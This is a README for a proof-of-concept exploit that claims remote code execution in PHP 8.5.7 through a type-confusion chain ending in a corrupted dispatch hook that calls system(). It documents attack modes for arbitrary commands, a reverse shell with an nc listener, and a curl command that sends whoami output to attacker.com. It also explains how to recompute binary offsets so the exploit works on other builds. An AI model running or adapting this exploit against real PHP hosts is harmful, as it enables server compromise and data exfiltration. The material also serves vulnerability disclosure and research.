# PHP 8.5.7 RCE - Remote Code Execution in PHP via Type Confusion (PHP2SHELL variant)

**Write-up:** https://sn0xs-organization.gitbook.io/sn0x-order.org/bb-web-hunt/rce-in-php

---

<img width="1672" height="941" alt="image" src="https://github.com/user-attachments/assets/4e0bc503-ce09-46ea-a915-1d5d1efc1e23" />


## Overview

A remote code execution chain in PHP 8.5.7 exploiting type confusion across four internal subsystems:

| Stage | Component | What happens |
|-------|-----------|--------------|
| 1 | `ArrayIterator` | Type-confused property write to internal objects |
| 2 | `StreamBucket` | `data` field read as string pointer by native code |
| 3 | Stream filters | Heap spray + marker-based address leak |
| 4 | `SoapClient` | `_cookies` reference overwritten to forged `HashTable` |
| 5 | `zend_symtable_update` | Numeric cookie name → integer-key update on forged table |
| 6 | `zend_execute_internal` | Corrupted dispatch hook → `zif_system()` |

---

## Files

```
sn0xPoc.php     — Full multi-mode PoC (marker / calc / shell / cmd / info)
calc_poc.php    — Minimal standalone calc PoC
validate.sh     — Automated validation wrapper
evidence/       — Created by validate.sh; contains run logs and marker files
```

---

## Requirements

- PHP 8.5.7 CLI Linux x86_64
- SOAP extension enabled (`--enable-soap`)
- `/proc/self/maps` and `/proc/self/mem` readable (default on Linux, non-containerised)

Check:
```bash
php8.5 -n -m | grep -i soap
```

---

## Usage

### Mode 1 - Marker proof (default)

Writes `PHP857_RCE` to `/tmp/php857_rce_<pid>.txt`.

```bash
php8.5 -n sn0xPoc.php --marker
```

Expected output:
```
[✓] MARKER FOUND: PHP857_RCE
[✓] RCE CONFIRMED on PHP 8.5.7
```

---

### Mode 2 - Calculator PoC

Spawns `xcalc` on Linux / `calc.exe` on Windows.

```bash
php8.5 -n calc_poc.php
# or
php8.5 -n sn0xPoc.php --calc
```

---

### Mode 3 - Arbitrary command

```bash
php8.5 -n sn0xPoc.php --cmd "id > /tmp/pwned"
php8.5 -n sn0xPoc.php --cmd "curl http://attacker.com/\$(whoami)"
```

---

### Mode 4 - Reverse shell

```bash
# Listener
nc -lvnp 4444

# PoC
php8.5 -n sn0xPoc.php --shell --lhost 127.0.0.1 --lport 4444
```

---

### Mode 5 - Info / dry-run

Prints resolved addresses without executing.

```bash
php8.5 -n sn0xPoc.php --info
```

---

### Automated validation

```bash
chmod +x validate.sh
./validate.sh /usr/bin/php8.5
./validate.sh /usr/bin/php8.5 --calc
```

---

## Adapting offsets to a different build

The offsets `ZEND_EXECUTE_INTERNAL_OFF` and `ZIF_SYSTEM_OFF` are build-specific.

```bash
# Find them for your binary:
nm -D /usr/bin/php8.5 | grep -E 'zend_execute_internal|zif_system'

# Calculate offset from PIE base:
# offset = symbol_va - pie_base
# PIE base from /proc/<pid>/maps (line with r-xp and the binary path)
```

Update the constants at the top of `sn0xPoc.php` and `calc_poc.php` accordingly.

---

## Chain diagram

<img width="656" height="647" alt="image" src="https://github.com/user-attachments/assets/dae8c815-a406-428e-83e3-ea65a8006c0f" />

---

## Proof screenshots / GDB trace

See `evidence/` after running `validate.sh`, or the write-up linked above for the full GDB stack trace showing:

- `zend_hash_index_update()` called on the forged table
- Stack frame at `zif_system()` with the target command
- Marker file creation confirmed

---

## References

- PHP bug tracker: https://bugs.php.net
- PHP source: https://github.com/php/php-src
- `zend_hash.h`: https://github.com/php/php-src/blob/master/Zend/zend_hash.h
- `spl_array.c`: https://github.com/php/php-src/blob/master/ext/spl/spl_array.c
- `php_http.c` (SOAP): https://github.com/php/php-src/blob/master/ext/soap/php_http.c
- `stream_bucket_new()` manual: https://www.php.net/stream_bucket_new
